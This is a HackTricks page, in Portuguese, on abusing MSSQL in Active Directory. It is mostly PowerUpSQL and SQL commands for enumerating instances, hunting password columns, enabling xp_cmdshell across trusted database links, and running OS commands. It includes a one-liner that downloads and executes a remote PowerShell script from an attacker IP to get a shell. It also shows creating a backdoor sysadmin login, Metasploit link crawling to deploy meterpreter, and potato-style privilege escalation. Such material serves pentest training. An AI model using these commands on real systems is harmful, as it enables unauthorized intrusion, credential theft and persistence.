# Abuso do MSSQL AD

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## **Enumeração / Descoberta do MSSQL**

O módulo powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) é muito útil nesse caso.
```powershell
Import-Module .\PowerupSQL.psd1
```
### Enumerando a partir da rede sem sessão de domínio
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### Enumerando de dentro do domínio
```powershell
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## Uso Básico do MSSQL

### Acessar Banco de Dados
```powershell
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

Também pode ser possível **executar comandos** dentro do host MSSQL
```powershell
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### Truques Básicos de Hacking do MSSQL

Verifique na página mencionada na **seção seguinte como fazer isso manualmente.**

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

## Links Confiáveis do MSSQL

Se uma instância do MSSQL é confiável (link de banco de dados) por uma instância diferente do MSSQL. Se o usuário tiver privilégios sobre o banco de dados confiável, ele será capaz de **usar o relacionamento de confiança para executar consultas também na outra instância**. Essas confianças podem ser encadeadas e, em algum momento, o usuário pode ser capaz de encontrar algum banco de dados mal configurado onde ele pode executar comandos.

**Os links entre bancos de dados funcionam mesmo através de confianças entre florestas.**

### Abuso do Powershell
```powershell
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
### Metasploit

Você pode facilmente verificar links confiáveis usando o Metasploit.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
Observe que o metasploit tentará abusar apenas da função `openquery()` no MSSQL (portanto, se você não puder executar comandos com `openquery()`, precisará tentar o método `EXECUTE` **manualmente** para executar comandos, veja mais abaixo.)

### Manual - Openquery()

Do **Linux** você poderia obter um shell de console MSSQL com **sqsh** e **mssqlclient.py.**

Do **Windows** você também poderia encontrar os links e executar comandos manualmente usando um **cliente MSSQL como** [**HeidiSQL**](https://www.heidisql.com)

_Login usando autenticação do Windows:_

![](<../../.gitbook/assets/image (167) (1).png>)

#### Encontrar Links Confiáveis
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![](<../../.gitbook/assets/image (168).png>)

#### Executar consultas em link confiável

Execute consultas através do link (exemplo: encontrar mais links na nova instância acessível):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
{% hint style="warning" %}
Verifique onde as aspas duplas e simples são usadas, é importante usá-las dessa maneira.
{% endhint %}

![](<../../.gitbook/assets/image (169).png>)

Você pode continuar essa cadeia de links confiáveis para sempre manualmente.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
Se não for possível realizar ações como `exec xp_cmdshell` a partir de `openquery()`, tente com o método `EXECUTE`.

### Manual - EXECUTE

Também é possível abusar de links confiáveis usando `EXECUTE`:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Escalação de Privilégios Local

O **usuário local MSSQL** geralmente possui um tipo especial de privilégio chamado **`SeImpersonatePrivilege`**. Isso permite que a conta "impersonate a client after authentication" (impersonar um cliente após autenticação).

Uma estratégia que muitos autores desenvolveram é forçar um serviço SYSTEM a se autenticar em um serviço falso ou de intermediário criado pelo atacante. Esse serviço falso é então capaz de se passar pelo serviço SYSTEM enquanto ele está tentando se autenticar.

[SweetPotato](https://github.com/CCob/SweetPotato) possui uma coleção dessas várias técnicas que podem ser executadas por meio do comando `execute-assembly` do Beacon.
